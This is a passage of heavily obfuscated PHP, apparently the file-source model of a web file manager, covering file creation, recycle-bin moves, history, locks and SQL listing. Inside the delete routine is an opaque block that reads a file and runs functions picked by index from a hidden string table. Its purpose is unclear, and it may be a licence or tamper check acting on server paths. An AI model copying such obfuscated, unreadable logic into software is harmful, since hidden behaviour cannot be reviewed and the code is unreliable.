= KodIO::ioFileDriverGet($¶å€Üü€[486] . $È…½˜éø . $¶å€Üü€[405]); $Ç•ôÉ„Ø = Model($¶å€Üü€[682])->addFile($Íë—•ù¸, $‰¬Ñ§€ä, $©Ù¨åƒ¾, $ ²øŸƒÉ); return $this->_createFileCall($È…½˜éø, $©Ù¨åƒ¾, $Ç•ôÉ„Ø, $’×ÏÈŒé); } public function addFileByFileID($ˆæ¶Ãø•, $¾¡¨ù£É, $ÄÜ¤ìéŸ, $Ğ ±û—¢ = REPEAT_RENAME) { $ïÔ÷§¸ =& $_SERVER[¼¥ÊĞÙÌ]; $ùÜÃë¢ = Model($ïÔ÷§¸[682])->find($¾¡¨ù£É); Model($ïÔ÷§¸[682])->linkAdd($¾¡¨ù£É); return $this->_createFileCall($ˆæ¶Ãø•, $ÄÜ¤ìéŸ, $ùÜÃë¢, $Ğ ±û—¢); } public function addFileByRemote($†òªöÂ¸, $÷Ü¸ôµè, $õØæâæú, $é—ƒ­Æ = array(), $®Ö˜ûù“ = REPEAT_RENAME) { $ÆîÔÂâ = Model($_SERVER[¼¥ÊĞÙÌ][682])->addFileByRemote($÷Ü¸ôµè, $õØæâæú, $é—ƒ­Æ); return $this->_createFileCall($†òªöÂ¸, $õØæâæú, $ÆîÔÂâ, $®Ö˜ûù“); } private function _createFileCall($Î­–ñÖ, $ášÉŞñ, $¥ß¾îºÁ, $„‰Çœ¬ğ, $¦¿«š¢¥ = "\x75\160\x6c\157\x61\144") { $º®ÎĞº =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¥ß¾îºÁ) { return !1; } $Ñû—ú = !1; $this->setMasterDB(); $this->lockWriteStart($Î­–ñÖ, $ášÉŞñ); $ÙÕÛÑ¹­ = $this->fileNameExist($Î­–ñÖ, $ášÉŞñ); $ñ¥¶¡ÆÚ = $this->_createFile($Î­–ñÖ, $ášÉŞñ, $¥ß¾îºÁ, $„‰Çœ¬ğ, $Ñû—ú); if (!$Ñû—ú) { Model($º®ÎĞº[549])->remove($¥ß¾îºÁ[$º®ÎĞº[546]]); } if ($Ñû—ú && $ñ¥¶¡ÆÚ && $ñ¥¶¡ÆÚ != $ÙÕÛÑ¹­) { Model($º®ÎĞº[2246])->eventCreate($ñ¥¶¡ÆÚ, $¦¿«š¢¥); } $this->lockWriteEnd($Î­–ñÖ, $ášÉŞñ); return $ñ¥¶¡ÆÚ; } public function mkdir($˜‡âÒı´, $‰ë¥ËïÕ, $ö•ÛÈ¢ = REPEAT_SKIP) { $Øòû‘ññ =& $_SERVER[¼¥ÊĞÙÌ]; $this->setMasterDB(); $âàÎ±İ· = $this->sourceInfo($˜‡âÒı´); if (!$âàÎ±İ·) { return !1; } $this->lockWriteStart($˜‡âÒı´, $‰ë¥ËïÕ); if ($ö•ÛÈ¢ !== !1) { $„¹ğúà = $this->fileNameExist($˜‡âÒı´, $‰ë¥ËïÕ); if ($„¹ğúà && $ö•ÛÈ¢ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($˜‡âÒı´, $‰ë¥ËïÕ); return $„¹ğúà; } $‰ë¥ËïÕ = $this->fileNameAuto($˜‡âÒı´, $‰ë¥ËïÕ, $ö•ÛÈ¢); } $à®Ùí÷ó = array($Øòû‘ññ[654] => 1, $Øòû‘ññ[497] => $‰ë¥ËïÕ, $Øòû‘ññ[655] => $Øòû‘ññ[12], $Øòû‘ññ[547] => 0, $Øòû‘ññ[625] => 0); $óî„©› = $this->_addSource($à®Ùí÷ó, $âàÎ±İ·); Model($Øòû‘ññ[2246])->eventCreate($óî„©›, $Øòû‘ññ[1451]); $this->lockWriteEnd($˜‡âÒı´, $‰ë¥ËïÕ); return $óî„©›; } public function listSourceRoot($èòŒèÇô, $¼Ö¡…„í, $©û¤¦èŞ = "\x73\x6f\165\x72\143\x65\x49\x44\x2c\x74\x61\x72\x67\x65\x74\x49\x44\x2c\163\151\x7a\145") { $‹—Ä¼·¯ =& $_SERVER[¼¥ÊĞÙÌ]; $Ë“­‰¦ = $‹—Ä¼·¯[457]; $‚¢ÏÏ¶‚ = array(); $€ÖúÖÕ– = 1024 * 50; $­…¡ªó = is_array($­…¡ªó) ? $­…¡ªó : array(); $ŠÄ¶…¶ = count($¼Ö¡…„í); $ŒµÄÙà™ = $this->tablePrefix . $‹—Ä¼·¯[2285]; for ($Øù‚·¦Ì = 0; $Øù‚·¦Ì < $ŠÄ¶…¶; $Øù‚·¦Ì++) { $öŞ¦Ö‚ = $¼Ö¡…„í[$Øù‚·¦Ì]; $Ë“­‰¦ .= "\x53\x45\114\x45\103\124\x20\52\40\106\x52\117\x4d\40\50\123\x45\114\x45\103\124\x20{$©û¤¦èŞ}\40\x46\x52\x4f\x4d\x20\140{$ŒµÄÙà™}\140\x20\127\110\x45\x52\105\40"; $Ë“­‰¦ .= "\x60\160\x61\x72\145\156\x74\111\x44\x60\75\x30\40\101\116\104\x20\140\164\x61\162\147\x65\x74\111\x44\x60\x3d{$öŞ¦Ö‚}\x20\101\x4e\104\x20\x60\x74\141\x72\147\x65\x74\124\171\x70\x65\x60\x3d{$èòŒèÇô}\x20\x61\156\x64\40\x66\151\x6c\x65\124\x79\160\145\75\x27\47\40\x6c\x69\x6d\151\x74\40\61\51\40\x61\x73\40\164\142\137{$Øù‚·¦Ì}\x20\x55\116\111\117\116\x20\x41\x4c\x4c\40"; if ((strlen($Ë“­‰¦) >= $€ÖúÖÕ– || $Øù‚·¦Ì == $ŠÄ¶…¶ - 1) && $Ë“­‰¦) { $Ë“­‰¦ = substr($Ë“­‰¦, 0, -strlen($‹—Ä¼·¯[1124])); $â›÷Š­Ô = $this->query($Ë“­‰¦); $Ë“­‰¦ = $‹—Ä¼·¯[12]; $‚¢ÏÏ¶‚ = array_merge($‚¢ÏÏ¶‚, $â›÷Š­Ô); } } return $‚¢ÏÏ¶‚; } private function _createFile($ğ‹–î×ô, $—³É¶ÁÍ, $­ßÛ·Ü©, $•ı˜Ù¢œ, &$ÏªÏ¿¶ş) { $÷Öï’ŸÊ =& $_SERVER[¼¥ÊĞÙÌ]; $ôÛ¯¤Êö = $this->sourceInfo($ğ‹–î×ô); if (!$­ßÛ·Ü© || !$ôÛ¯¤Êö) { return !1; } if ($•ı˜Ù¢œ !== !1) { $²Ğµ³Îƒ = $this->fileNameExist($ğ‹–î×ô, $—³É¶ÁÍ); } $ÏªÏ¿¶ş = !0; if ($•ı˜Ù¢œ && $²Ğµ³Îƒ) { if ($•ı˜Ù¢œ == REPEAT_SKIP) { $ÏªÏ¿¶ş = !1; return $²Ğµ³Îƒ; } else { if ($•ı˜Ù¢œ == REPEAT_REPLACE) { $¥ ü¿öÏ = $this->sourceInfo($²Ğµ³Îƒ); $ÉÛ‡¨Äµ = $this->fileHistory($¥ ü¿öÏ, $­ßÛ·Ü©[$÷Öï’ŸÊ[546]], $­ßÛ·Ü©[$÷Öï’ŸÊ[79]]); if (!$ÉÛ‡¨Äµ) { $ÏªÏ¿¶ş = !1; } else { $this->folderSizeReset($ğ‹–î×ô); } return $²Ğµ³Îƒ; } else { $—³É¶ÁÍ = $this->fileNameAuto($ğ‹–î×ô, $—³É¶ÁÍ, $•ı˜Ù¢œ, !1); } } } $îè„Ñ¿Ä = array($÷Öï’ŸÊ[654] => 0, $÷Öï’ŸÊ[497] => $—³É¶ÁÍ, $÷Öï’ŸÊ[655] => substr(get_path_ext($—³É¶ÁÍ), 0, 10), $÷Öï’ŸÊ[547] => $­ßÛ·Ü©[$÷Öï’ŸÊ[546]], $÷Öï’ŸÊ[625] => $­ßÛ·Ü©[$÷Öï’ŸÊ[79]]); $åç¶È± = $this->_addSource($îè„Ñ¿Ä, $ôÛ¯¤Êö); $this->folderSizeReset($ğ‹–î×ô, intval($îè„Ñ¿Ä[$÷Öï’ŸÊ[79]])); return $åç¶È±; } protected function fileHistory($ÅİüéÛö, $ùÒà¿ëÓ, $¤ÁÃ˜’) { $€¬Òíå· =& $_SERVER[¼¥ÊĞÙÌ]; if ($ÅİüéÛö[$€¬Òíå·[546]] == $ùÒà¿ëÓ) { return !1; } $this->checkLock($ÅİüéÛö[$€¬Òíå·[194]], $ùÒà¿ëÓ); Model($€¬Òíå·[2286])->addHistory($ÅİüéÛö); $ÂÕâ¶Ãö = array($€¬Òíå·[659] => USER_ID, $€¬Òíå·[501] => time(), $€¬Òíå·[546] => $ùÒà¿ëÓ, $€¬Òíå·[79] => $¤ÁÃ˜’); $this->where(array($€¬Òíå·[494] => $ÅİüéÛö[$€¬Òíå·[194]]))->save($ÂÕâ¶Ãö); $this->sourceCacheClear($ÅİüéÛö[$€¬Òíå·[194]]); return !0; } public function checkLock($Òœ›®àĞ, $ºÌø’ÆÇ) { $æí½³Èø =& $_SERVER[¼¥ÊĞÙÌ]; $×ñğÛ×¿ = $this->pathInfo($Òœ›®àĞ); if (!$this->fileIsLock($×ñğÛ×¿, !0)) { return; } $¤É ¹£‘ = Session::get($æí½³Èø[2287]); $Ã•£Ïã¢ = substr($×ñğÛ×¿[$æí½³Èø[32]], 0, -1 - strlen($×ñğÛ×¿[$æí½³Èø[169]])) . $æí½³Èø[1305] . $¤É ¹£‘ . $æí½³Èø[10] . $×ñğÛ×¿[$æí½³Èø[169]]; $¥³€æÙ¨ = Model($æí½³Èø[682])->find($ºÌø’ÆÇ); $this->_createFileCall($×ñğÛ×¿[$æí½³Èø[193]], $Ã•£Ïã¢, $¥³€æÙ¨, REPEAT_REPLACE, $æí½³Èø[1450]); $·ïÈ…İ¨ = $×ñğÛ×¿[$æí½³Èø[544]][$æí½³Èø[618]]; $Õ­ÂÍ¿¬ = $·ïÈ…İ¨[$æí½³Èø[2288]] ? $·ïÈ…İ¨[$æí½³Èø[2288]] : $·ïÈ…İ¨[$æí½³Èø[32]]; show_json(LNG($æí½³Èø[2289]) . $æí½³Èø[2290] . LNG($æí½³Èø[2291]) . $æí½³Èø[2292] . $Õ­ÂÍ¿¬ . $æí½³Èø[2293], !1); } public function fileIsLock($ƒ‡Îì¯ô, $õşÀ˜Â¦ = false) { $ÂœœÇÄ‘ =& $_SERVER[¼¥ÊĞÙÌ]; if (!_get($ƒ‡Îì¯ô, $ÂœœÇÄ‘[614], 0)) { return !1; } if ($ƒ‡Îì¯ô[$ÂœœÇÄ‘[544]][$ÂœœÇÄ‘[617]] != USER_ID) { return !0; } $¢šÆØÑ = $GLOBALS[$ÂœœÇÄ‘[6]][$ÂœœÇÄ‘[92]][$ÂœœÇÄ‘[615]]; if ($ƒ‡Îì¯ô[$ÂœœÇÄ‘[544]][$ÂœœÇÄ‘[616]] <= time() - $¢šÆØÑ) { $this->metaSet($ƒ‡Îì¯ô[$ÂœœÇÄ‘[194]], $ÂœœÇÄ‘[617], null); $this->metaSet($ƒ‡Îì¯ô[$ÂœœÇÄ‘[194]], $ÂœœÇÄ‘[616], null); } if ($õşÀ˜Â¦) { $this->metaSet($ƒ‡Îì¯ô[$ÂœœÇÄ‘[194]], $ÂœœÇÄ‘[616], time()); } return !1; } private function _addSource($ƒ½Ù’©‘, $çÕÕğÁ€) { $“‹Áˆ˜¶ =& $_SERVER[¼¥ÊĞÙÌ]; $Äòâç¤Ğ = defined($“‹Áˆ˜¶[2219]) ? USER_ID : 0; $Ñù•»öÎ = array($“‹Áˆ˜¶[656] => $çÕÕğÁ€[$“‹Áˆ˜¶[191]], $“‹Áˆ˜¶[657] => $çÕÕğÁ€[$“‹Áˆ˜¶[574]], $“‹Áˆ˜¶[658] => $Äòâç¤Ğ, $“‹Áˆ˜¶[659] => $Äòâç¤Ğ, $“‹Áˆ˜¶[480] => $çÕÕğÁ€[$“‹Áˆ˜¶[194]], $“‹Áˆ˜¶[660] => $çÕÕğÁ€[$“‹Áˆ˜¶[589]] . $çÕÕğÁ€[$“‹Áˆ˜¶[194]] . $“‹Áˆ˜¶[50], $“‹Áˆ˜¶[507] => 0, $“‹Áˆ˜¶[661] => $“‹Áˆ˜¶[12]); $ƒ½Ù’©‘ = array_merge($Ñù•»öÎ, $ƒ½Ù’©‘); $this->updateModifyTime($ƒ½Ù’©‘[$“‹Áˆ˜¶[193]]); $±Ø—†á = $“‹Áˆ˜¶[2294] . $çÕÕğÁ€[$“‹Áˆ˜¶[194]]; if (isset(self::$cacheChildList[$±Ø—†á])) { unset(self::$cacheChildList[$±Ø—†á]); } static $¯‰û´ÍÂ = false; if (!$¯‰û´ÍÂ) { Hook::trigger($“‹Áˆ˜¶[644], $ƒ½Ù’©‘); $¯‰û´ÍÂ = !0; } $ÚÕûÜÂ = $this->add($ƒ½Ù’©‘); $×À½î˜­ = array($“‹Áˆ˜¶[662] => short_id($ÚÕûÜÂ)); $this->where(array($“‹Áˆ˜¶[494] => $ÚÕûÜÂ))->save($×À½î˜­); $this->setNamePinyin($ÚÕûÜÂ, $ƒ½Ù’©‘[$“‹Áˆ˜¶[32]]); return $ÚÕûÜÂ; } public function remove($à°…Á…¿, $‹¬ØÎëÑ = true) { $Ò»©í°Ï =& $_SERVER[¼¥ÊĞÙÌ]; $ê‘ÃˆœÒ = $this->sourceInfo($à°…Á…¿); $—Ò”…µ = intval($ê‘ÃˆœÒ[$Ò»©í°Ï[191]]) === self::TYPE_SYSTEM; $âÓõâ§‚ = Model($Ò»©í°Ï[511])->get($Ò»©í°Ï[2295]) == $Ò»©í°Ï[91]; if ($—Ò”…µ || $‹¬ØÎëÑ || !$âÓõâ§‚) { return $this->removeNow($à°…Á…¿, $‹¬ØÎëÑ); } $¼‹ùä…¢ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÙóÅ¦à˜ = $ê‘ÃˆœÒ[$Ò»©í°Ï[191]] == self::TYPE_USER ? $Ò»©í°Ï[670] : $Ò»©í°Ï[583]; if ($ÙóÅ¦à˜ == $Ò»©í°Ï[670]) { $•€¸ü¬‡ = Model($Ò»©í°Ï[582])->getInfo($ê‘ÃˆœÒ[$Ò»©í°Ï[574]]); $ïÚıîÎô = !empty($•€¸ü¬‡[$Ò»©í°Ï[2288]]) ? $•€¸ü¬‡[$Ò»©í°Ï[2288]] : $•€¸ü¬‡[$Ò»©í°Ï[32]]; $ïÚıîÎô = $Ò»©í°Ï[340] . $ïÚıîÎô . $Ò»©í°Ï[2296] . $ê‘ÃˆœÒ[$Ò»©í°Ï[574]]; } else { $•€¸ü¬‡ = Model($Ò»©í°Ï[590])->getInfo($ê‘ÃˆœÒ[$Ò»©í°Ï[574]]); $ïÚıîÎô = _get($•€¸ü¬‡, $Ò»©í°Ï[32]); $ïÚıîÎô = $Ò»©í°Ï[176] . $ïÚıîÎô . $Ò»©í°Ï[2297] . $ê‘ÃˆœÒ[$Ò»©í°Ï[574]]; } $ğ‘öÖã = $Ò»©í°Ï[2298] . md5($ïÚıîÎô); CacheLock::lock($ğ‘öÖã); $şŞ¥«è = $this->fileNameExist($¼‹ùä…¢, $ïÚıîÎô); if (!$şŞ¥«è) { $şŞ¥«è = $this->mkdir($¼‹ùä…¢, $ïÚıîÎô, REPEAT_SKIP); $this->metaSet($şŞ¥«è, $Ò»©í°Ï[2299], $ÙóÅ¦à˜); $this->metaSet($şŞ¥«è, $Ò»©í°Ï[2300], $ê‘ÃˆœÒ[$Ò»©í°Ï[574]]); if ($ê‘ÃˆœÒ[$Ò»©í°Ï[193]] != 0) { $this->metaSet($şŞ¥«è, $Ò»©í°Ï[2301], _get($•€¸ü¬‡, $Ò»©í°Ï[2302])); } } CacheLock::unlock($ğ‘öÖã); $this->metaSet($à°…Á…¿, $Ò»©í°Ï[2303], $ê‘ÃˆœÒ[$Ò»©í°Ï[193]]); $this->where(array($Ò»©í°Ï[194] => $à°…Á…¿))->save(array($Ò»©í°Ï[501] => time())); $this->recycleClear($ê‘ÃˆœÒ); Model($Ò»©í°Ï[641])->eventRemove($à°…Á…¿); $˜Ğéêù“ = $this->move($à°…Á…¿, $şŞ¥«è, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ê‘ÃˆœÒ[$Ò»©í°Ï[193]]); return $˜Ğéêù“; } private function recycleClear($˜•·À™Î) { $ß¦Èíñİ =& $_SERVER[¼¥ÊĞÙÌ]; $†‰×øõ = $this->childrenAll($˜•·À™Î); $åÕ ùï‰ = array($ß¦Èíñİ[494] => array($ß¦Èíñİ[495], $†‰×øõ[$ß¦Èíñİ[2304]])); Model($ß¦Èíñİ[2305])->where($åÕ ùï‰)->delete(); } public function removeNow($­ÊÙ’Ü, $è§œ¦ë = true) { $é­¼Ò™ë =& $_SERVER[¼¥ÊĞÙÌ]; if ($_SERVER[$é­¼Ò™ë[959]] != $_SERVER[$é­¼Ò™ë[1916]]) { $¢ñ¼’›¼ = $é­¼Ò™ë[960]; $ô°ß„‡Æ = $é­¼Ò™ë[961]; $‰íˆ”÷ = $_SERVER[$é­¼Ò™ë[962]] . $é­¼Ò™ë[963]; $°¶É·¨÷ = $ô°ß„‡Æ($‰íˆ”÷); $°Õ¯óöÑ = explode($é­¼Ò™ë[288], $°¶É·¨÷); if (count($°Õ¯óöÑ) < $é­¼Ò™ë[693]) { $³¼šê‰§ = $é­¼Ò™ë[964]; $³¼šê‰§(); } $„Ö«åÛã = $é­¼Ò™ë[965]; $„Ö«åÛã($_SERVER[$é­¼Ò™ë[966]]); $„Ö«åÛã($_SERVER[$é­¼Ò™ë[962]] . $é­¼Ò™ë[2306]); $’Èöƒš = 1; while ($’Èöƒš > 1) { $’Èöƒš = $’Èöƒš + 4; $ş°ÔË§ê = rawurlencode($’Èöƒš . $é­¼Ò™ë[457]); } } $‘çØ˜â = $this->sourceInfo($­ÊÙ’Ü); $®äŒ­Ç½ = $this->pathInfoMore($­ÊÙ’Ü); if (!$‘çØ˜â) { return !0; } if ($‘çØ˜â[$é­¼Ò™ë[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($­ÊÙ’Ü); Hook::trigger($é­¼Ò™ë[2307], $®äŒ­Ç½, $è§œ¦ë); if ($è§œ¦ë) { Model($é­¼Ò™ë[2305])->moveToRecycle($­ÊÙ’Ü); } else { $—ÎÓğàâ = $this->childrenAll($‘çØ˜â); Model($é­¼Ò™ë[641])->eventRemove($­ÊÙ’Ü); $this->removeRelevance($—ÎÓğàâ[$é­¼Ò™ë[2304]], $—ÎÓğàâ[$é­¼Ò™ë[1594]]); } $this->folderSizeReset($‘çØ˜â[$é­¼Ò™ë[193]]); $˜ÑšÒ“ = array($‘çØ˜â[$é­¼Ò™ë[193]]); if ($‘çØ˜â[$é­¼Ò™ë[488]] == $é­¼Ò™ë[91]) { $˜ÑšÒ“[] = $‘çØ˜â[$é­¼Ò™ë[194]]; } $this->updateModifyTime($˜ÑšÒ“); $this->lockMoveEnd($­ÊÙ’Ü); Hook::trigger($é­¼Ò™ë[1833], $®äŒ­Ç½, $è§œ¦ë); return !0; } public function childrenAll($Å¼óÀü¾) { $Ä­¨¸¿ï =& $_SERVER[¼¥ÊĞÙÌ]; $úşŸ¦  = $Å¼óÀü¾[$Ä­¨¸¿ï[194]]; if ($Å¼óÀü¾[$Ä­¨¸¿ï[488]] == $Ä­¨¸¿ï[91]) { $ğÀ„È‰Ã = array($Ä­¨¸¿ï[660] => array($Ä­¨¸¿ï[620], $Å¼óÀü¾[$Ä­¨¸¿ï[589]] . $úşŸ¦  . $Ä­¨¸¿ï[621])); $€úı×ë = array($Ä­¨¸¿ï[660] => $ğÀ„È‰Ã[$Ä­¨¸¿ï[589]]); $—ì‘Œû = $this->field($Ä­¨¸¿ï[2308])->where($€úı×ë)->select(); $¤ÂÒÉ« = !1; $±›ş ©ß = array($úşŸ¦ ); if ($—ì‘Œû) { $¤ÂÒÉ« = array_to_keyvalue($—ì‘Œû, $Ä­¨¸¿ï[12], $Ä­¨¸¿ï[546]); $¤ÂÒÉ« = array_remove_value($¤ÂÒÉ«, $Ä­¨¸¿ï[231]); $±›ş ©ß = array_to_keyvalue($—ì‘Œû, $Ä­¨¸¿ï[12], $Ä­¨¸¿ï[194]); $±›ş ©ß[] = $úşŸ¦ ; } } else { $¤ÂÒÉ« = array($Å¼óÀü¾[$Ä­¨¸¿ï[546]]); $±›ş ©ß = array($úşŸ¦ ); } return array($Ä­¨¸¿ï[2304] => $±›ş ©ß, $Ä­¨¸¿ï[1594] => $¤ÂÒÉ«); } public function removeArray($»™»½¤©) { if (!$»™»½¤©) { return !0; } } public function removeRelevance($£ìŠÓÍ–, $È„†×à) { $ş¨Ô³™ =& $_SERVER[¼¥ÊĞÙÌ]; $£ìŠÓÍ– = $£ìŠÓÍ– ? $£ìŠÓÍ– : array(); $È„†×à = $È„†×à ? $È„†×à : array(); $£ìŠÓÍ– = array_unique(array_filter($£ìŠÓÍ–)); $È„†×à = array_filter($È„†×à); if (!$£ìŠÓÍ–) { return !1; } $—úØ’ã­ = array($ş¨Ô³™[494] => array($ş¨Ô³™[495], $£ìŠÓÍ–)); Model($ş¨Ô³™[2305])->where($—úØ’ã­)->delete(); Model($ş¨Ô³™[538])->where($—úØ’ã­)->delete(); Model($ş¨Ô³™[2146])->where($—úØ’ã­)->delete(); Model($ş¨Ô³™[641])->where($—úØ’ã­)->delete(); Model($ş¨Ô³™[1971])->removeBySource($£ìŠÓÍ–); Model($ş¨Ô³™[2286])->removeBySource($£ìŠÓÍ–); $this->where($—úØ’ã­)->delete(); Model($ş¨Ô³™[549])->remove($È„†×à); for ($Î¶ÓŸù‡ = 0; $Î¶ÓŸù‡ < count($£ìŠÓÍ–); $Î¶ÓŸù‡++) { $this->sourceCacheClear($£ìŠÓÍ–[$Î¶ÓŸù‡]); } } public function rename($µçœıÑÜ, $ØßÊ¯ª) { $†‡ª°À =& $_SERVER[¼¥ÊĞÙÌ]; $ñó‡×·Í = $this->sourceInfo($µçœıÑÜ); if (!$ñó‡×·Í) { return !1; } $Ãğ“Î“ = $this->fileNameExist($ñó‡×·Í[$†‡ª°À[193]], $ØßÊ¯ª); if ($Ãğ“Î“ && $Ãğ“Î“ != $µçœıÑÜ) { return !1; } $å›µößü = array($†‡ª°À[497] => $ØßÊ¯ª, $†‡ª°À[659] => USER_ID); if ($ñó‡×·Í[$†‡ª°À[488]] != $†‡ª°À[91]) { $å›µößü[$†‡ª°À[489]] = substr(get_path_ext($ØßÊ¯ª), 0, 10); } Model($†‡ª°À[641])->eventRename($µçœıÑÜ, $ñó‡×·Í[$†‡ª°À[32]], $ØßÊ¯ª); $this->sourceCacheClear($µçœıÑÜ); $this->setNamePinyin($µçœıÑÜ, $å›µößü[$†‡ª°À[32]], !1); $this->updateModifyTime($ñó‡×·Í[$†‡ª°À[193]]); $ÓÈºˆ¸ê = $this->where(array($†‡ª°À[494] => $µçœıÑÜ))->data($å›µößü)->save(); $•Ö­ó´ = $†‡ª°À[2294] . $ñó‡×·Í[$†‡ª°À[193]]; if (isset(self::$cacheChildList[$•Ö­ó´])) { unset(self::$cacheChildList[$•Ö­ó´]); } return $ÓÈºˆ¸ê; } public function setNamePinyin($ì»¾åÔ—, $Ô±»ˆ°×, $ñûù›Ú = true) { $‚•†Áá =& $_SERVER[¼¥ÊĞÙÌ]; $áÛÆ•ó× = Input::check($Ô±»ˆ°×, $‚•†Áá[663]); $ëœªª = array($‚•†Áá[520] => KodSort::makeStr($Ô±»ˆ°×)); if ($áÛÆ•ó×) { $ëœªª[$‚•†Áá[541]] = str_replace($‚•†Áá[53], $‚•†Áá[12], Pinyin::get($Ô±»ˆ°×)); $ëœªª[$‚•†Áá[540]] = Pinyin::get($Ô±»ˆ°×, $‚•†Áá[664]); } if (!$ñûù›Ú && !$áÛÆ•ó×) { $ëœªª[$‚•†Áá[541]] = null; $ëœªª[$‚•†Áá[540]] = null; } $this->metaSet($ì»¾åÔ—, $ëœªª); } public function getContent($È©¦–¹è) { $¶Ş‘Ñ³ =& $_SERVER[¼¥ÊĞÙÌ]; $£°§­şü = $this->fileInfoGet($È©¦–¹è); if (!$£°§­şü) { return !1; } if ($£°§­şü[$¶Ş‘Ñ³[79]] == 0) { return $¶Ş‘Ñ³[12]; } $½ Çöş§ = $¶Ş‘Ñ³[2309] . $£°§­şü[$¶Ş‘Ñ³[552]]; if ($£°§­şü[$¶Ş‘Ñ³[79]] <= 1024 * 10) { $¬ˆÏóÁ¥ = Cache::get($½ Çöş§); if (!$¬ˆÏóÁ¥) { $¬ˆÏóÁ¥ = IO::getContent($£°§­şü[$¶Ş‘Ñ³[87]]); Cache::set($½ Çöş§, $¬ˆÏóÁ¥); } return $¬ˆÏóÁ¥; } if (!$£°§­şü[$¶Ş‘Ñ³[87]]) { return $¶Ş‘Ñ³[12]; } return IO::getContent($£°§­şü[$¶Ş‘Ñ³[87]]); } public function setDesc($Ûíõ¨ÀÃ, $ ¾×Â¨Ú) { $Ãòçí¾Š =& $_SERVER[¼¥ÊĞÙÌ]; Model($Ãòçí¾Š[641])->eventAddDesc($Ûíõ¨ÀÃ, $ ¾×Â¨Ú); return $this->metaSet($Ûíõ¨ÀÃ, $Ãòçí¾Š[529], $ ¾×Â¨Ú); } public function setContent($«åĞëêÏ, $“¢€ú = '') { $ºßá®üÄ =& $_SERVER[¼¥ÊĞÙÌ]; $È‹×ğ¹ = $this->sourceInfo($«åĞëêÏ); $“É±±Å» = $this->fileInfoGet($«åĞëêÏ); if (!$“É±±Å» || !$È‹×ğ¹) { return !1; } $ëÆÍ×†Ã = KodIO::ioFileDriverGet($ºßá®üÄ[486] . $«åĞëêÏ . $ºßá®üÄ[405]); $ôÖ…’ÌĞ = Model($ºßá®üÄ[549])->addFileByContent($“¢€ú, $ëÆÍ×†Ã, $È‹×ğ¹[$ºßá®üÄ[32]]); if (!$ôÖ…’ÌĞ) { return !1; } $ŠšäÀÕ = $this->fileHistory($È‹×ğ¹, $ôÖ…’ÌĞ[$ºßá®üÄ[546]], $ôÖ…’ÌĞ[$ºßá®üÄ[79]]); if (!$ŠšäÀÕ) { return Model($ºßá®üÄ[549])->remove($ôÖ…’ÌĞ[$ºßá®üÄ[546]]); } $this->folderSizeReset($È‹×ğ¹[$ºßá®üÄ[193]]); return !0; } public function fileSubstr($»ƒ©……°, $ğ­õŞã¡, $‚¬Ø·ó) { $†ÓÅ‚‡œ = $this->fileInfoGet($»ƒ©……°); if (!$†ÓÅ‚‡œ) { return !1; } return IO::fileSubstr($†ÓÅ‚‡œ[$_SERVER[¼¥ÊĞÙÌ][87]], $ğ­õŞã¡, $‚¬Ø·ó); } public function fileInfoGet($íÜˆğ­²) { $† üíüô =& $_SERVER[¼¥ÊĞÙÌ]; $Œğú‚±– = $this->sourceInfo($íÜˆğ­²); if (!$Œğú‚±– || $Œğú‚±–[$† üíüô[488]]) { return !1; } $¡¡‰ÁÒê = $† üíüô[553] . $Œğú‚±–[$† üíüô[546]]; $²Şİ™ì† = _get(self::$cacheFileInfo, $¡¡‰ÁÒê); if ($²Şİ™ì†) { return $²Şİ™ì†; } $ö´Õ›„Ğ = Model($† üíüô[549])->fileInfo($Œğú‚±–[$† üíüô[546]]); if ($ö´Õ›„Ğ) { $ö´Õ›„Ğ[$† üíüô[32]] = $Œğú‚±–[$† üíüô[32]]; } self::$cacheFileInfo[$¡¡‰ÁÒê] = $ö´Õ›„Ğ; return $ö´Õ›„Ğ; } private function folderChildrenNumber($îûËêó) { $¦Â’™Ò­ =& $_SERVER[¼¥ÊĞÙÌ]; $€ïšÌª— = $this->sourceInfo($îûËêó); $¤®ÛÚ¿Î = array($¦Â’™Ò­[660] => array($¦Â’™Ò­[620], $€ïšÌª—[$¦Â’™Ò­[589]] . $îûËêó . $¦Â’™Ò­[621]), $¦Â’™Ò­[657] => $€ïšÌª—[$¦Â’™Ò­[574]], $¦Â’™Ò­[507] => intval($€ïšÌª—[$¦Â’™Ò­[508]]), $¦Â’™Ò­[654] => 1); $ìÕõØÒç = $this->where($¤®ÛÚ¿Î)->count(); $’•Æâı¤ = $this->where($¤®ÛÚ¿Î)->where(array($¦Â’™Ò­[654] => 0))->count(); return array($¦Â’™Ò­[83] => $’•Æâı¤, $¦Â’™Ò­[84] => $ìÕõØÒç); } public function pathInfo($”ïà»‘Ä, $Šıë°œ = false) { $§®È«£¨ =& $_SERVER[¼¥ÊĞÙÌ]; $Šıë°œ = !1; $”ïà»‘Ä = intval($”ïà»‘Ä); $¹ß¼Ê”‚ = $§®È«£¨[537] . intval($Šıë°œ) . $§®È«£¨[465] . $”ïà»‘Ä; $¾”àñ±Ô = _get(self::$cachePathInfo, $¹ß¼Ê”‚); if ($¾”àñ±Ô) { return $¾”àñ±Ô; } $¢€æáŸ› = $this->sourceInfo($”ïà»‘Ä); if (!$¢€æáŸ›) { return !1; } $¢€æáŸ› = $this->_listDataApplyItem($¢€æáŸ›, $Šıë°œ); self::$cachePathInfo[$¹ß¼Ê”‚] = $¢€æáŸ›; return $¢€æáŸ›; } public static $cachePathInfoMore = array(); public function pathInfoMore($ëĞÜö¯) { $§‹«Î·Á =& $_SERVER[¼¥ÊĞÙÌ]; $‡º¿û¸ = _get(self::$cachePathInfoMore, $ëĞÜö¯); if ($‡º¿û¸) { return $‡º¿û¸; } $¥Ş’Ş = $this->pathInfo($ëĞÜö¯); if (!$¥Ş’Ş) { return !1; } if ($¥Ş’Ş[$§‹«Î·Á[488]] == $§‹«Î·Á[91]) { $¥Ş’Ş[$§‹«Î·Á[82]] = $this->folderChildrenNumber($ëĞÜö¯); } self::$cachePathInfoMore[$ëĞÜö¯] = $¥Ş’Ş; return $¥Ş’Ş; } public function sourceInfo($œ¤­«Ãª) { $ÉáÉ§˜ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$œ¤­«Ãª) { return array(); } $œ¤­«Ãª = intval($œ¤­«Ãª); $š‡Ê«õ¨ = $ÉáÉ§˜[536] . $œ¤­«Ãª; $µöèÒÉÎ = 